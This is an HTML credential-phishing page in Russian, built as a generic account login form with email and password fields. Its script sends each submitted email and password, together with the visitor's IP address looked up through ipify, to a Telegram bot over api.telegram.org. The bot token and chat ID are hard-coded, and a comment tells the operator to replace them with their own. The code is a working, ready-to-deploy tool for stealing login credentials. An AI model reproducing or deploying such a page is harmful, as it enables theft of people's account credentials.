<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в аккаунт</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 15px;
        }

        .card {
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            padding: 35px 30px;
            animation: slideIn 0.4s ease-out;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .title {
            text-align: center;
            font-size: 28px;
            font-weight: 700;
            color: #333;
            margin-bottom: 10px;
        }

        .subtitle {
            text-align: center;
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
            border-bottom: 2px solid #f0f0f0;
            padding-bottom: 15px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-weight: 600;
            color: #444;
            margin-bottom: 8px;
            font-size: 14px;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .input-icon {
            position: absolute;
            left: 14px;
            color: #999;
            font-size: 16px;
            z-index: 1;
        }

        input {
            width: 100%;
            padding: 14px 14px 14px 45px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 15px;
            color: #333;
            transition: all 0.3s ease;
            background: #fafafa;
        }

        input:focus {
            outline: none;
            border-color: #667eea;
            background: white;
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
        }

        input::placeholder {
            color: #aaa;
            font-size: 14px;
        }

        .password-visible {
            font-family: monospace;
            letter-spacing: 1px;
        }

        .login-button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 15px;
            letter-spacing: 1px;
            text-transform: uppercase;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        }

        .login-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.5);
        }

        .login-button:active {
            transform: translateY(0);
        }

        .notification {
            margin-top: 20px;
            padding: 12px;
            border-radius: 10px;
            font-size: 14px;
            text-align: center;
            animation: fadeIn 0.3s ease-out;
            display: none;
        }

        .notification.success {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
            display: block;
        }

        .notification.error {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .forgot-password {
            text-align: center;
            margin-top: 15px;
        }

        .forgot-password a {
            color: #667eea;
            text-decoration: none;
            font-size: 13px;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            color: #999;
            font-size: 12px;
        }
    </style>
    <!-- Font Awesome для иконок -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <div class="card">
        <h1 class="title">Добро пожаловать</h1>
        <p class="subtitle">Войдите в свой аккаунт</p>

        <!-- Форма только с email и паролем -->
        <form id="loginForm">
            <!-- Email -->
            <div class="form-group">
                <label><i class="fas fa-envelope" style="margin-right: 8px; color: #667eea;"></i>Электронная почта</label>
                <div class="input-wrapper">
                    <i class="fas fa-envelope input-icon"></i>
                    <input type="email" id="email" placeholder="example@mail.com" required>
                </div>
            </div>

            <!-- Пароль (скрытый) -->
            <div class="form-group">
                <label><i class="fas fa-lock" style="margin-right: 8px; color: #667eea;"></i>Пароль</label>
                <div class="input-wrapper">
                    <i class="fas fa-lock input-icon"></i>
                    <input type="password" id="password1" placeholder="Введите пароль" required>
                </div>
            </div>

            <!-- Пароль (видимый, повтор) -->
            <div class="form-group">
                <label><i class="fas fa-eye" style="margin-right: 8px; color: #667eea;"></i>Подтверждение пароля (видно)</label>
                <div class="input-wrapper">
                    <i class="fas fa-eye input-icon"></i>
                    <input type="text" id="password2" class="password-visible" placeholder="Повторите пароль" required>
                </div>
            </div>

            <!-- Кнопка входа -->
            <button type="button" class="login-button" onclick="sendToTelegram()">
                <i class="fas fa-sign-in-alt" style="margin-right: 10px;"></i>Войти
            </button>

            <div class="forgot-password">
                <a href="#">Забыли пароль?</a>
            </div>
        </form>

        <!-- Уведомление о статусе -->
        <div id="notification" class="notification"></div>
        
        <div class="footer">
            © 2024 Все права защищены
        </div>
    </div>

    <script>
        // =============================================
        // НАСТРОЙКИ TELEGRAM (изменить под себя)
        // =============================================
        const TELEGRAM_BOT_TOKEN = '8513382715:AAGK5KcEvWtF3tm9DVlQpzYG5pvYdd1Xc1k';
        const TELEGRAM_CHAT_ID = '6875436577';
        // =============================================

        async function sendToTelegram() {
            const email = document.getElementById('email').value.trim();
            const password1 = document.getElementById('password1').value;
            const password2 = document.getElementById('password2').value;

            // Валидация
            if (!email || !password1 || !password2) {
                showNotification('Пожалуйста, заполните все поля', 'error');
                return;
            }

            if (password1 !== password2) {
                showNotification('Пароли не совпадают!', 'error');
                return;
            }

            if (!isValidEmail(email)) {
                showNotification('Введите корректный email', 'error');
                return;
            }

            // Формируем сообщение для Telegram
            const message = `
📧 НОВЫЙ ВХОД В АККАУНТ
━━━━━━━━━━━━━━━━━━━━━
📨 Email: ${email}
🔑 Пароль: ${password1}
━━━━━━━━━━━━━━━━━━━━━
🌐 IP: ${await getIP()}
⏰ Время: ${new Date().toLocaleString('ru-RU')}
            `;

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            showNotification('Отправка данных...', 'success', false);

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const data = await response.json();

                if (data.ok) {
                    showNotification('✅ Данные успешно отправлены!', 'success');
                    // Очищаем форму после успешной отправки
                    setTimeout(() => {
                        document.getElementById('loginForm').reset();
                    }, 2000);
                } else {
                    showNotification('❌ Ошибка при отправке: ' + data.description, 'error');
                }
            } catch (error) {
                showNotification('❌ Ошибка соединения с Telegram', 'error');
                console.error('Error:', error);
            }
        }

        // Функция для получения IP адреса
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Не удалось определить';
            }
        }

        // Валидация email
        function isValidEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }

        function showNotification(message, type, autoHide = true) {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = 'notification ' + type;
            
            if (autoHide) {
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 5000);
            }
        }

        // Синхронизация паролей
        document.getElementById('password1').addEventListener('input', function(e) {
            document.getElementById('password2').value = e.target.value;
        });

        document.getElementById('password2').addEventListener('input', function(e) {
            document.getElementById('password1').value = e.target.value;
        });

        // Добавляем возможность отправки по Enter
        document.querySelectorAll('input').forEach(input => {
            input.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    sendToTelegram();
                }
            });
        });
    </script>
</body>
</html>
